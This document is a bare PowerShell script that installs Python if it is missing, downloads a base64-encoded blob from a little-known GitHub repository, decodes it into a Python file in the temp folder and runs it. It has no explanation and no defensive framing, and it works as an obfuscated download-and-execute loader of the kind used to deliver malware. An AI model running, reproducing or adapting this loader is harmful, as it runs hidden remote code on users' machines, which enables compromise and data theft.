$p = "$env:TEMP\script.py"
$l = "$env:TEMP\script_error.log"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

if (!(Get-Command python -ErrorAction SilentlyContinue)) {
    $r = "$env:TEMP\python_embed"
    if (!(Test-Path $r)) { New-Item -ItemType Directory -Path $r | Out-Null }
    $zip = "$r\py.zip"
    (New-Object Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.11.5/python-3.11.5-embed-amd64.zip', $zip)
    Expand-Archive $zip -DestinationPath $r -Force
    $env:PATH = "$env:PATH;$r;$r\Scripts"
    [Environment]::SetEnvironmentVariable('PATH', $env:PATH, 'Process')
}

$raw = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/manotuslk2-web/profile/main/string.txt')
$clean = -join ($raw.ToCharArray() | Where-Object { $_ -match '[a-zA-Z0-9\+/=]' })
[IO.File]::WriteAllBytes($p, [Convert]::FromBase64String($clean))
python $p
